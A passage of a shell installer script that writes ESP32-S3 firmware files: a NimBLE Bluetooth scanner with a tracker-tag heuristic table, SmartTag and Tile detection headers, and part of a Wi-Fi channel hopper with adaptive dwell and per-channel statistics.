        if (g_ble_lock == NULL) return ESP_ERR_NO_MEM;
    }

    esp_err_t ret = nimble_port_init();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "nimble_port_init failed: %s", esp_err_to_name(ret));
        return ret;
    }

    ble_hs_cfg.sync_cb = ble_on_sync;
    ble_hs_cfg.reset_cb = ble_on_reset;

    ble_svc_gap_init();
    ble_svc_gap_device_name_set("ESP32-S3-Toolkit");

    nimble_port_freertos_init(ble_host_task);

    g_ble_init_done = true;

    ble_periodic_init();
    ble_gatt_enumerator_init(); 
    ble_iso_init();

    ESP_LOGI(TAG, "BLE scanner initialized");
    return ESP_OK;
}

esp_err_t ble_scanner_start(uint32_t duration_sec)
{
    if (!g_ble_init_done) return ESP_ERR_INVALID_STATE;
    if (!atomic_load(&g_ble_synced)) return ESP_ERR_INVALID_STATE;
    if (atomic_load(&g_ble_scanning) || atomic_load(&g_ble_advertising)) return ESP_ERR_INVALID_STATE;

    if (g_ble_lock != NULL) {
        xSemaphoreTake(g_ble_lock, portMAX_DELAY);
        g_ble_count = 0;
        memset(g_ble_list, 0, sizeof(g_ble_list));
        xSemaphoreGive(g_ble_lock);
    }

    struct ble_gap_disc_params disc_params = {0};
    disc_params.itvl = 0x0060;  
    disc_params.window = 0x0030; 
    disc_params.filter_policy = BLE_HCI_SCAN_FILT_NO_WL;
    disc_params.limited = 0;
    disc_params.passive = 0; 
    disc_params.filter_duplicates = 0;

    int32_t duration_ms = (duration_sec == 0) ? BLE_HS_FOREVER : (int32_t)(duration_sec * 1000);

    uint8_t own_addr_type;
    int rc = ble_hs_id_infer_auto(0, &own_addr_type);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_hs_id_infer_auto failed: rc=%d", rc);
        return ESP_FAIL;
    }

    atomic_store(&g_ble_scanning, true);
    led_set_state(LED_STATE_SCANNING);

    rc = ble_gap_disc(own_addr_type, duration_ms, &disc_params, ble_gap_event_cb, NULL);
    if (rc != 0) {
        atomic_store(&g_ble_scanning, false);
        led_set_state(LED_STATE_IDLE);
        ESP_LOGE(TAG, "ble_gap_disc failed: rc=%d", rc);
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "BLE scan started, duration=%" PRIu32 " s", duration_sec);
    return ESP_OK;
}

esp_err_t ble_scanner_stop(void)
{
    if (!atomic_load(&g_ble_scanning)) return ESP_OK;
    ble_gap_disc_cancel();
    atomic_store(&g_ble_scanning, false);
    led_set_state(LED_STATE_IDLE);
    ESP_LOGI(TAG, "BLE scan stopped");
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Public API: Printers
 * ----------------------------------------------------------------------- */

void ble_scanner_fprint(FILE *out)
{
    if (out == NULL || g_ble_lock == NULL) return;

    /* CRITICAL FIX: Copy list to heap to avoid holding lock during slow I/O */
    ble_info_t *local_list = malloc(sizeof(ble_info_t) * MAX_DISCOVERED_BLE);
    if (local_list == NULL) {
        ESP_LOGE(TAG, "Failed to allocate memory for BLE report");
        return;
    }

    xSemaphoreTake(g_ble_lock, portMAX_DELAY);
    uint16_t count = g_ble_count;
    if (count > MAX_DISCOVERED_BLE) count = MAX_DISCOVERED_BLE;
    memcpy(local_list, g_ble_list, sizeof(ble_info_t) * count);
    xSemaphoreGive(g_ble_lock);

    fprintf(out, "\n");
    fprintf(out, "=========================================================================\n");
    fprintf(out, "                     DISCOVERED BLE DEVICES (%d)\n", count);
    fprintf(out, "=========================================================================\n");
    fprintf(out, " #  | BLE MAC           | TYPE    | RSSI | PKTS     | EXT ADV     | PA SYNC    | PHY       | ISO        | VENDOR      | DEVICE NAME\n");
    fprintf(out, "----+-------------------+---------+------+----------+-------------+------------+-----------+------------+-------------+-----------\n");

    for (int i = 0; i < count; i++) {
        char extadv[12] = "-";
        if (local_list[i].ext_adv_seen) {
            if (local_list[i].has_aux_ptr) snprintf(extadv, sizeof(extadv), "aux");
            else if (local_list[i].has_adi) snprintf(extadv, sizeof(extadv), "adi");
            else snprintf(extadv, sizeof(extadv), "ext");
        }
        bool synced = false;
        if (local_list[i].ext_adv_seen) {
            synced = ble_periodic_is_synced(
                (local_list[i].adv_mode > 0) ? 1 : 0,
                local_list[i].mac
            );
        }
        char pa_col[12] = "-";
        if (local_list[i].periodic_adv_seen) {
            if (synced) snprintf(pa_col, sizeof(pa_col), "SYNC");
            else if (local_list[i].has_sync_info) snprintf(pa_col, sizeof(pa_col), "PA");
            else snprintf(pa_col, sizeof(pa_col), "XFR");
        }
        char phy_col[12] = "-";
        if (local_list[i].phy_coded_s8) snprintf(phy_col, sizeof(phy_col), "S8");
        else if (local_list[i].phy_coded) snprintf(phy_col, sizeof(phy_col), "S2");
        else if (local_list[i].phy_2m) snprintf(phy_col, sizeof(phy_col), "2M");
        else if (local_list[i].phy_1m) snprintf(phy_col, sizeof(phy_col), "1M");
        else if (local_list[i].phy_coded_supported) snprintf(phy_col, sizeof(phy_col), "coded");
        char iso_col[12] = "-";
        if (local_list[i].iso_seen) {
            if (local_list[i].has_big_info) snprintf(iso_col, sizeof(iso_col), "BIG");
            else snprintf(iso_col, sizeof(iso_col), "ISO");
        }
        fprintf(
            out,
            "%-2d | %02X:%02X:%02X:%02X:%02X:%02X | %-7s | %-4d | %-8" PRIu32 " | %-11s | %-11s | %-9s | %-10s | %-11s | %s\n",
            i + 1,
            local_list[i].mac[5], local_list[i].mac[4], local_list[i].mac[3],
            local_list[i].mac[2], local_list[i].mac[1], local_list[i].mac[0],
            (local_list[i].addr_type == 0) ? "Public" : "Random",
            local_list[i].rssi,
            local_list[i].pkt_count,
            extadv, pa_col, phy_col, iso_col,
            get_vendor_name(local_list[i].mfg_id),
            local_list[i].name
        );
    }

    fprintf(out, "=========================================================================\n");
    free(local_list);
}

void ble_scanner_print_results(void) { ble_scanner_fprint(stdout); }

esp_err_t ble_scanner_save_report(const char *path)
{
    if (path == NULL) return ESP_ERR_INVALID_ARG;
    FILE *f = fopen(path, "w");
    if (f == NULL) {
        ESP_LOGE(TAG, "Failed to open BLE report file: %s", path);
        return ESP_FAIL;
    }
    ble_scanner_fprint(f);
    fclose(f);
    ESP_LOGI(TAG, "BLE report saved: %s", path);
    return ESP_OK;
}

void ble_tracker_print(void)
{
    if (g_ble_lock == NULL) return;

    /* CRITICAL FIX: Copy list to heap to avoid holding lock during slow I/O */
    ble_info_t *local_list = malloc(sizeof(ble_info_t) * MAX_DISCOVERED_BLE);
    if (local_list == NULL) return;

    xSemaphoreTake(g_ble_lock, portMAX_DELAY);
    uint16_t count = g_ble_count;
    if (count > MAX_DISCOVERED_BLE) count = MAX_DISCOVERED_BLE;
    memcpy(local_list, g_ble_list, sizeof(ble_info_t) * count);
    xSemaphoreGive(g_ble_lock);

    printf("\n");
    printf("=========================================================================\n");
    printf("                POSSIBLE TRACKERS / TAGS HEURISTICS\n");
    printf("=========================================================================\n");
    printf(" #  | BLE MAC           | SCORE | VENDOR      | NAME\n");
    printf("----+-------------------+-------+-------------+-------------------------\n");

    int shown = 0;
    for (int i = 0; i < count; i++) {
        if (local_list[i].tracker_score >= 2) {
            shown++;
            printf(
                "%-2d | %02X:%02X:%02X:%02X:%02X:%02X | %-5d | %-11s | %s\n",
                shown,
                local_list[i].mac[5], local_list[i].mac[4], local_list[i].mac[3],
                local_list[i].mac[2], local_list[i].mac[1], local_list[i].mac[0],
                local_list[i].tracker_score,
                get_vendor_name(local_list[i].mfg_id),
                local_list[i].name
            );
        }
    }

    if (shown == 0) {
        printf("No high-confidence suspicious devices in current table.\n");
    }

    printf("=========================================================================\n");
    printf("Note: BLE MAC randomization causes many false positives.\n");

    free(local_list);
}

/* -------------------------------------------------------------------------
 *  Public API: Getters
 * ----------------------------------------------------------------------- */

uint16_t ble_scanner_get_count(void) 
{ 
    if (g_ble_lock == NULL) return 0;
    xSemaphoreTake(g_ble_lock, portMAX_DELAY);
    uint16_t c = g_ble_count;
    xSemaphoreGive(g_ble_lock);
    return c; 
}

bool ble_scanner_get_ext_adv(const uint8_t *mac, bool *out_ext_adv, bool *out_aux_ptr,
                              bool *out_adi, uint8_t *out_adv_mode, bool *out_scan_rsp, uint8_t *out_tx_power)
{
    if (mac == NULL || out_ext_adv == NULL) return false;
    *out_ext_adv = false;
    if (out_aux_ptr) *out_aux_ptr = false;
    if (out_adi) *out_adi = false;
    if (out_adv_mode) *out_adv_mode = 0;
    if (out_scan_rsp) *out_scan_rsp = false;
    if (out_tx_power) *out_tx_power = 0x7F;

    xSemaphoreTake(g_ble_lock, portMAX_DELAY);
    for (int i = 0; i < g_ble_count; i++) {
        if (memcmp(g_ble_list[i].mac, mac, 6) == 0) {
            *out_ext_adv = g_ble_list[i].ext_adv_seen;
            if (out_aux_ptr) *out_aux_ptr = g_ble_list[i].has_aux_ptr;
            if (out_adi) *out_adi = g_ble_list[i].has_adi;
            if (out_adv_mode) *out_adv_mode = g_ble_list[i].adv_mode;
            if (out_scan_rsp) *out_scan_rsp = g_ble_list[i].has_scan_rsp;
            if (out_tx_power) *out_tx_power = g_ble_list[i].tx_power;
            xSemaphoreGive(g_ble_lock);
            return true;
        }
    }
    xSemaphoreGive(g_ble_lock);
    return false;
}

bool ble_scanner_get_periodic(const uint8_t *mac, bool *out_periodic_seen, bool *out_has_sync_info,
                              bool *out_sync_transfer_seen, uint16_t *out_interval_1_25ms, uint8_t *out_sid)
{
    if (mac == NULL || out_periodic_seen == NULL) return false;
    *out_periodic_seen = false;
    if (out_has_sync_info) *out_has_sync_info = false;
    if (out_sync_transfer_seen) *out_sync_transfer_seen = false;
    if (out_interval_1_25ms) *out_interval_1_25ms = 0;
    if (out_sid) *out_sid = 0xFF;

    xSemaphoreTake(g_ble_lock, portMAX_DELAY);
    for (int i = 0; i < g_ble_count; i++) {
        if (memcmp(g_ble_list[i].mac, mac, 6) == 0) {
            *out_periodic_seen = g_ble_list[i].periodic_adv_seen;
            if (out_has_sync_info) *out_has_sync_info = g_ble_list[i].has_sync_info;
            if (out_sync_transfer_seen) *out_sync_transfer_seen = g_ble_list[i].sync_transfer_seen;
            if (out_interval_1_25ms) *out_interval_1_25ms = g_ble_list[i].periodic_adv_interval;
            if (out_sid) *out_sid = g_ble_list[i].sync_handle;
            xSemaphoreGive(g_ble_lock);
            return true;
        }
    }
    xSemaphoreGive(g_ble_lock);
    return false;
}

bool ble_scanner_get_phy(const uint8_t *mac, bool *out_coded, bool *out_coded_s8,
                          bool *out_1m, bool *out_2m, bool *out_coded_supp)
{
    if (mac == NULL || out_coded == NULL) return false;
    *out_coded = false;
    if (out_coded_s8) *out_coded_s8 = false;
    if (out_1m) *out_1m = false;
    if (out_2m) *out_2m = false;
    if (out_coded_supp) *out_coded_supp = false;

    xSemaphoreTake(g_ble_lock, portMAX_DELAY);
    for (int i = 0; i < g_ble_count; i++) {
        if (memcmp(g_ble_list[i].mac, mac, 6) == 0) {
            *out_coded = g_ble_list[i].phy_coded;
            if (out_coded_s8) *out_coded_s8 = g_ble_list[i].phy_coded_s8;
            if (out_1m) *out_1m = g_ble_list[i].phy_1m;
            if (out_2m) *out_2m = g_ble_list[i].phy_2m;
            if (out_coded_supp) *out_coded_supp = g_ble_list[i].phy_coded_supported;
            xSemaphoreGive(g_ble_lock);
            return true;
        }
    }
    xSemaphoreGive(g_ble_lock);
    return false;
}

bool ble_scanner_get_iso(const uint8_t *mac, bool *out_iso_seen, bool *out_has_big,
                         uint8_t *out_iso_channels, uint8_t out_bis[4], uint32_t *out_interval_us)
{
    if (mac == NULL || out_iso_seen == NULL) return false;
    *out_iso_seen = false;
    if (out_has_big) *out_has_big = false;
    if (out_iso_channels) *out_iso_channels = 0;
    if (out_bis) memset(out_bis, 0, 4);
    if (out_interval_us) *out_interval_us = 0;

    xSemaphoreTake(g_ble_lock, portMAX_DELAY);
    for (int i = 0; i < g_ble_count; i++) {
        if (memcmp(g_ble_list[i].mac, mac, 6) == 0) {
            *out_iso_seen = g_ble_list[i].iso_seen;
            if (out_has_big) *out_has_big = g_ble_list[i].has_big_info;
            if (out_iso_channels) *out_iso_channels = g_ble_list[i].iso_channels;
            if (out_bis) memcpy(out_bis, g_ble_list[i].bis_handles, 4);
            if (out_interval_us) *out_interval_us = g_ble_list[i].iso_interval_us;
            xSemaphoreGive(g_ble_lock);
            return true;
        }
    }
    xSemaphoreGive(g_ble_lock);
    return false;
}

/* -------------------------------------------------------------------------
 *  Public API: Advertising
 * ----------------------------------------------------------------------- */

esp_err_t ble_advertise_start(const char *name, uint32_t duration_sec)
{
    if (!g_ble_init_done) return ESP_ERR_INVALID_STATE;
    if (!atomic_load(&g_ble_synced)) return ESP_ERR_INVALID_STATE;

    if (atomic_load(&g_ble_scanning)) {
        ESP_LOGW(TAG, "Stop BLE scan before advertising");
        return ESP_ERR_INVALID_STATE;
    }

    if (atomic_load(&g_ble_advertising)) {
        ble_gap_adv_stop();
        atomic_store(&g_ble_advertising, false);
    }

    snprintf(g_adv_name, sizeof(g_adv_name), "%s", (name != NULL && name[0] != '\0') ? name : "ESP32-S3-LAB");
    ble_svc_gap_device_name_set(g_adv_name);

    struct ble_hs_adv_fields fields = {0};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.name = (uint8_t *)g_adv_name;
    fields.name_len = (uint8_t)strlen(g_adv_name);

    int rc = ble_gap_adv_set_fields(&fields);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_adv_set_fields failed: rc=%d", rc);
        return ESP_FAIL;
    }

    struct ble_gap_adv_params adv_params = {0};
    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;

    uint8_t own_addr_type;
    rc = ble_hs_id_infer_auto(0, &own_addr_type);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_hs_id_infer_auto failed: rc=%d", rc);
        return ESP_FAIL;
    }

    int32_t duration_ms = (duration_sec == 0) ? BLE_HS_FOREVER : (int32_t)(duration_sec * 1000);

    rc = ble_gap_adv_start(own_addr_type, NULL, duration_ms, &adv_params, ble_adv_event_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_adv_start failed: rc=%d", rc);
        return ESP_FAIL;
    }

    atomic_store(&g_ble_advertising, true);
    led_set_state(LED_STATE_SCANNING);
    ESP_LOGI(TAG, "BLE advertising started: %s", g_adv_name);
    return ESP_OK;
}

esp_err_t ble_advertise_stop(void)
{
    if (!atomic_load(&g_ble_advertising)) return ESP_OK;
    ble_gap_adv_stop();
    atomic_store(&g_ble_advertising, false);
    led_set_state(LED_STATE_IDLE);
    ESP_LOGI(TAG, "BLE advertising stopped");
    return ESP_OK;
}

bool ble_scanner_is_initialized(void)
{
    return g_ble_init_done;
}

uint16_t ble_scanner_count_rpas(void)
{
    if (g_ble_lock == NULL) return 0;
    uint16_t rpas = 0;
    xSemaphoreTake(g_ble_lock, portMAX_DELAY);
    for (int i = 0; i < g_ble_count; i++) {
        if (g_ble_list[i].rpa_seen ||
            (g_ble_list[i].addr_type != 0 && (g_ble_list[i].mac[5] & 0xC0) == 0x40)) {
            rpas++;
        }
    }
    xSemaphoreGive(g_ble_lock);
    return rpas;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_scanner.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_scanner.h"
#ifndef BLE_SCANNER_H
#define BLE_SCANNER_H

#include "common_types.h"
#include "esp_err.h"
#include <stdio.h>

#ifdef __cplusplus
extern "C" {
#endif

esp_err_t ble_scanner_init(void);
bool ble_scanner_is_initialized(void);
uint16_t ble_scanner_count_rpas(void);
esp_err_t ble_scanner_start(uint32_t duration_sec);
esp_err_t ble_scanner_stop(void);

void ble_scanner_print_results(void);
void ble_scanner_fprint(FILE *out);
esp_err_t ble_scanner_save_report(const char *path);
uint16_t ble_scanner_get_count(void);

void ble_tracker_print(void);

bool ble_scanner_get_ext_adv(const uint8_t *mac,
                              bool *out_ext_adv, bool *out_aux_ptr,
                              bool *out_adi, uint8_t *out_adv_mode,
                              bool *out_scan_rsp, uint8_t *out_tx_power);

bool ble_scanner_get_periodic(const uint8_t *mac,
                              bool *out_periodic_seen,
                              bool *out_has_sync_info,
                              bool *out_sync_transfer_seen,
                              uint16_t *out_interval_1_25ms,
                              uint8_t *out_sid);

bool ble_scanner_get_phy(const uint8_t *mac,
                          bool *out_coded, bool *out_coded_s8,
                          bool *out_1m, bool *out_2m, bool *out_coded_supp);

bool ble_scanner_get_iso(const uint8_t *mac,
                         bool *out_iso_seen, bool *out_has_big,
                         uint8_t *out_iso_channels, uint8_t out_bis[4],
                         uint32_t *out_interval_us);

esp_err_t ble_advertise_start(const char *name, uint32_t duration_sec);
esp_err_t ble_advertise_stop(void);

#ifdef __cplusplus
}
#endif

#endif // BLE_SCANNER_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_scanner.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_smarttag.h"
#ifndef BLE_SMARTTAG_H
#define BLE_SMARTTAG_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

#define SMARTTAG_MAX_DEVICES 16

typedef struct {
    uint8_t mac[6];
    uint8_t type;      /* 1 = Samsung SmartTag, 2 = Tile */
    uint8_t battery;   /* 0-100, 0xFF if unknown */
    bool valid;
} smarttag_device_t;

esp_err_t smarttag_init(void);
static inline esp_err_t ble_smarttag_init(void) { return smarttag_init(); }
void smarttag_parse_adv(const uint8_t *adv, size_t len,
                        const uint8_t *mac);
size_t smarttag_list(smarttag_device_t *out, size_t max);
void smarttag_clear(void);

#ifdef __cplusplus
}
#endif

#endif /* BLE_SMARTTAG_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_smarttag.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/channel_hopper.c"
/*
 * ============================================================================
 *  channel_hopper.c  —  Smart Wi-Fi channel hopper with per-channel stats
 * ============================================================================
 */

#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <inttypes.h>
#include <limits.h>
#include <stdatomic.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "esp_err.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_system.h"
#if __has_include("esp_random.h")
#include "esp_random.h"
#endif
#include "esp_heap_caps.h"

#include "channel_hopper.h"
#include "wifi_sniffer.h"
#include "usb_cdc.h"
#include "watchdog.h"

static const char *TAG = "ch_hopper";

#define DEFAULT_DWELL_MS        100
#define MIN_DWELL_MS            10
#define MAX_DWELL_MS            30000

#define ADAPTIVE_MIN_MS         10
#define ADAPTIVE_MAX_MS         1000

#define HOP_TASK_STACK          4096
#define HOP_TASK_PRIO           5
#define HOP_TASK_CORE           0

#define STOP_TIMEOUT_MS         1000
#define DWELL_WAIT_CHUNK_MS     5

static atomic_bool g_hop_active = ATOMIC_VAR_INIT(false);

static ch_hop_config_t g_hop_cfg = {
    .mode = CH_HOP_MODE_SEQUENTIAL,
    .dwell_ms = DEFAULT_DWELL_MS,
    .channel_mask = CH_HOP_MASK_ALL,
    .dwell_us = 0,
};

static ch_hop_stats_t g_hop_stats[14] = {0}; /* index 1..13 */

static SemaphoreHandle_t g_cfg_mutex = NULL;
static SemaphoreHandle_t g_stop_ack_sem = NULL;

/*
 * Stats updates happen from the Wi-Fi worker hot path.
 * Use a spinlock/critical section instead of a full mutex.
 */
static portMUX_TYPE g_stats_spin = portMUX_INITIALIZER_UNLOCKED;

static TaskHandle_t g_hop_task = NULL;
static _Atomic uint8_t g_current_channel = 0;

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */

static bool channel_valid(uint8_t channel)
{
    return channel >= CH_HOP_CHANNEL_MIN && channel <= CH_HOP_CHANNEL_MAX;
}

static uint16_t clamp_u16(uint16_t v, uint16_t lo, uint16_t hi)
{
    if (v < lo) return lo;
    if (v > hi) return hi;
    return v;
}

static const char *mode_str(ch_hop_mode_t mode)
{
    switch (mode) {
        case CH_HOP_MODE_RANDOM:     return "random";
        case CH_HOP_MODE_RSSI_OPT:   return "rssi_opt";
        case CH_HOP_MODE_ADAPTIVE:   return "adaptive";
        case CH_HOP_MODE_SEQUENTIAL:
        default:                     return "sequential";
    }
}

/*
 * Legacy compatibility:
 * Original code used uint8_t channel_mask where 0xFF meant "all channels".
 * That cannot represent channels 9-13, so we now use uint16_t.
 *
 * Treat 0x00FF as legacy "all channels".
 */
static uint16_t normalize_mask(uint16_t mask)
{
    if (mask == 0 || mask == 0x00FFu) {
        return CH_HOP_MASK_ALL;
    }
    return mask & CH_HOP_MASK_ALL;
}

static void normalize_config(ch_hop_config_t *cfg)
{
    if (cfg == NULL) {
        return;
    }

    if (cfg->mode > CH_HOP_MODE_ADAPTIVE) {
        cfg->mode = CH_HOP_MODE_SEQUENTIAL;
    }

    cfg->channel_mask = normalize_mask(cfg->channel_mask);

    if (cfg->dwell_us > 0) {
        cfg->dwell_ms = 0;
    } else {
        if (cfg->dwell_ms == 0) {
            cfg->dwell_ms = DEFAULT_DWELL_MS;
        }
        cfg->dwell_ms = clamp_u16(cfg->dwell_ms, MIN_DWELL_MS, MAX_DWELL_MS);
    }
}

static esp_err_t get_config_snapshot(ch_hop_config_t *out)
{
    if (out == NULL || g_cfg_mutex == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    xSemaphoreTake(g_cfg_mutex, portMAX_DELAY);
    *out = g_hop_cfg;
    xSemaphoreGive(g_cfg_mutex);

    normalize_config(out);
    return ESP_OK;
}

static bool break_requested(void)
{
    if (usb_cdc_break_signaled()) {
        usb_cdc_break_clear();
        return true;
    }
    return false;
}

/* -------------------------------------------------------------------------
 *  Stats helpers
 * ----------------------------------------------------------------------- */

static void stats_reset_all(void)
{
    taskENTER_CRITICAL(&g_stats_spin);
    memset(g_hop_stats, 0, sizeof(g_hop_stats));
    taskEXIT_CRITICAL(&g_stats_spin);
}

static void stats_copy_all(ch_hop_stats_t out[14])
{
    taskENTER_CRITICAL(&g_stats_spin);
    memcpy(out, g_hop_stats, sizeof(g_hop_stats));
    taskEXIT_CRITICAL(&g_stats_spin);
}

static void stats_enter_channel(uint8_t channel)
{
    if (!channel_valid(channel)) {
        return;
    }

    uint64_t now = esp_timer_get_time();

    taskENTER_CRITICAL(&g_stats_spin);
    g_hop_stats[channel].window_pkt_count = 0;
    g_hop_stats[channel].window_start_us = now;
    taskEXIT_CRITICAL(&g_stats_spin);
}

static void stats_leave_channel(uint8_t channel, uint32_t default_dwell_ms)
{
    if (!channel_valid(channel)) {
        return;
    }

    taskENTER_CRITICAL(&g_stats_spin);

    ch_hop_stats_t *s = &g_hop_stats[channel];

    uint32_t pkts = s->window_pkt_count;
    uint32_t dwell = s->adaptive_dwell_ms;

    if (dwell == 0) {
        dwell = default_dwell_ms;
    }

    if (dwell == 0) {
        dwell = DEFAULT_DWELL_MS;
    }

    /*
     * Simple adaptive policy:
     *
     *   very busy channel  -> stay longer
     *   moderately busy    -> stay slightly longer
     *   quiet channel      -> reduce dwell
     */
    if (pkts > 64) {
        dwell += 25;
    } else if (pkts > 32) {
        dwell += 10;
    } else if (pkts < 4) {
        dwell /= 2;
    } else if (pkts < 12) {
        dwell = (dwell * 8) / 10;
    }

    if (dwell < ADAPTIVE_MIN_MS) {
        dwell = ADAPTIVE_MIN_MS;
    }

    if (dwell > ADAPTIVE_MAX_MS) {
        dwell = ADAPTIVE_MAX_MS;
    }

    s->adaptive_dwell_ms = dwell;
    s->window_pkt_count = 0;
    s->window_start_us = 0;

    taskEXIT_CRITICAL(&g_stats_spin);
}

/* -------------------------------------------------------------------------
 *  Channel selection
 * ----------------------------------------------------------------------- */

static uint8_t next_channel(uint8_t cur, uint16_t mask)
{
    if (mask == CH_HOP_MASK_ALL) {
        return (cur == 0 || cur > CH_HOP_CHANNEL_MAX)
                   ? CH_HOP_CHANNEL_MIN
                   : (cur % CH_HOP_CHANNEL_MAX) + 1;
    }

    for (uint8_t step = 1; step <= CH_HOP_CHANNEL_MAX; step++) {
        uint8_t ch = ((cur + step - 1) % CH_HOP_CHANNEL_MAX) + 1;
        if (mask & (1u << (ch - 1))) {
            return ch;
        }
    }

    return CH_HOP_CHANNEL_MIN;
}

static uint8_t random_channel(uint16_t mask)
{
    uint8_t candidates[CH_HOP_CHANNEL_MAX];
    uint8_t n = 0;

    for (uint8_t ch = CH_HOP_CHANNEL_MIN; ch <= CH_HOP_CHANNEL_MAX; ch++) {
        if (mask & (1u << (ch - 1))) {
            candidates[n++] = ch;
        }
    }

    if (n == 0) {
        return CH_HOP_CHANNEL_MIN;
    }

    return candidates[esp_random() % n];
}

static uint8_t select_best_rssi_channel(uint8_t cur, uint16_t mask)
{
    ch_hop_stats_t stats[14];
    stats_copy_all(stats);

    uint8_t best = 0;
    int32_t best_rssi = INT32_MIN;

    for (uint8_t ch = CH_HOP_CHANNEL_MIN; ch <= CH_HOP_CHANNEL_MAX; ch++) {
        if (!(mask & (1u << (ch - 1)))) {
            continue;
        }

        const ch_hop_stats_t *s = &stats[ch];

        if (s->rssi_samples == 0) {
            continue;
        }

        int32_t avg = s->rssi_sum / (int32_t)s->rssi_samples;

        /*
         * Higher RSSI is better:
         *   -40 dBm > -85 dBm
         */
        if (avg > best_rssi) {
            best_rssi = avg;
            best = ch;
        }
    }

    if (best == 0) {
        return next_channel(cur, mask);
    }

    return best;
}

/* -------------------------------------------------------------------------
 *  Dwell / delay helpers
 * ----------------------------------------------------------------------- */

static bool wait_ms_interruptible(uint32_t ms)
{
    uint32_t elapsed = 0;

    while (elapsed < ms && atomic_load(&g_hop_active)) {
        if (break_requested()) {
            return false;
        }

        uint32_t chunk = ms - elapsed;
        if (chunk > DWELL_WAIT_CHUNK_MS) {
            chunk = DWELL_WAIT_CHUNK_MS;
        }

        if (chunk == 0) {
            break;
        }

        vTaskDelay(pdMS_TO_TICKS(chunk));
        elapsed += chunk;

        watchdog_task_refresh(TAG);
    }

    return atomic_load(&g_hop_active);
}

static bool wait_dwell(const ch_hop_config_t *cfg, uint8_t channel)
{
    if (cfg == NULL) {
        return false;
    }

    /*
     * Microsecond dwell override.
     * For < 1 ms, vTaskDelay is too coarse, so busy-wait.
     */
    if (cfg->dwell_us > 0) {
        if (cfg->dwell_us < 1000) {
            uint64_t start = esp_timer_get_time();

            while ((uint64_t)(esp_timer_get_time() - start) < cfg->dwell_us) {
                if (!atomic_load(&g_hop_active)) {
                    return false;
                }
            }

            watchdog_task_refresh(TAG);
            return atomic_load(&g_hop_active);
        }

        return wait_ms_interruptible((uint32_t)(cfg->dwell_us / 1000));
    }

    uint32_t dwell_ms = cfg->dwell_ms;

    if (cfg->mode == CH_HOP_MODE_ADAPTIVE) {
        uint32_t adaptive = 0;

        taskENTER_CRITICAL(&g_stats_spin);
        adaptive = g_hop_stats[channel].adaptive_dwell_ms;
        taskEXIT_CRITICAL(&g_stats_spin);

        if (adaptive > 0) {
            dwell_ms = adaptive;
        }
    }

    return wait_ms_interruptible(dwell_ms);
}

/* -------------------------------------------------------------------------
 *  Hopper task
 * ----------------------------------------------------------------------- */

static void channel_hopper_task(void *arg)
{
    (void)arg;

    ch_hop_config_t cfg;

    if (get_config_snapshot(&cfg) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to read config snapshot");
        if (g_stop_ack_sem != NULL) {
            xSemaphoreGive(g_stop_ack_sem);
        }
        vTaskDelete(NULL);
        return;
    }

    uint16_t mask = cfg.channel_mask;

    /*
     * Honor fixed channel if wifi_sniffer has one set.
     */
    uint8_t current = atomic_load(&g_wifi_fixed_channel);
    if (!channel_valid(current)) {
        current = next_channel(0, mask);
    }

    while (atomic_load(&g_hop_active)) {
        watchdog_task_refresh(TAG);

        if (break_requested()) {
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        if (get_config_snapshot(&cfg) != ESP_OK) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        mask = cfg.channel_mask;

        uint8_t fixed = atomic_load(&g_wifi_fixed_channel);
        if (channel_valid(fixed)) {
            current = fixed;
        }

        esp_err_t ret = esp_wifi_set_channel(current, WIFI_SECOND_CHAN_NONE);
        if (ret != ESP_OK) {
            ESP_LOGW(TAG, "esp_wifi_set_channel(%u) failed: %s",
                     current, esp_err_to_name(ret));
            wait_ms_interruptible(20);
            continue;
        }

        atomic_store(&g_current_channel, current);
        stats_enter_channel(current);

        bool dwell_ok = wait_dwell(&cfg, current);

        stats_leave_channel(current, cfg.dwell_ms);

        if (!dwell_ok || !atomic_load(&g_hop_active)) {
            break;
        }

        fixed = atomic_load(&g_wifi_fixed_channel);
        if (channel_valid(fixed)) {
            current = fixed;
            continue;
        }

        switch (cfg.mode) {
            case CH_HOP_MODE_RANDOM:
                current = random_channel(mask);
                break;

            case CH_HOP_MODE_RSSI_OPT:
                current = select_best_rssi_channel(current, mask);
                break;

            case CH_HOP_MODE_ADAPTIVE:
            case CH_HOP_MODE_SEQUENTIAL:
            default:
                current = next_channel(current, mask);
                break;
        }
    }

    if (g_stop_ack_sem != NULL) {
        xSemaphoreGive(g_stop_ack_sem);
    }

    vTaskDelete(NULL);
}

/* -------------------------------------------------------------------------
 *  Lifecycle
 * ----------------------------------------------------------------------- */

esp_err_t channel_hopper_init(void)
{
    if (g_cfg_mutex != NULL) {
        return ESP_OK;
    }

    g_cfg_mutex = xSemaphoreCreateMutex();
    g_stop_ack_sem = xSemaphoreCreateBinary();

    if (g_cfg_mutex == NULL || g_stop_ack_sem == NULL) {
        if (g_cfg_mutex != NULL) {
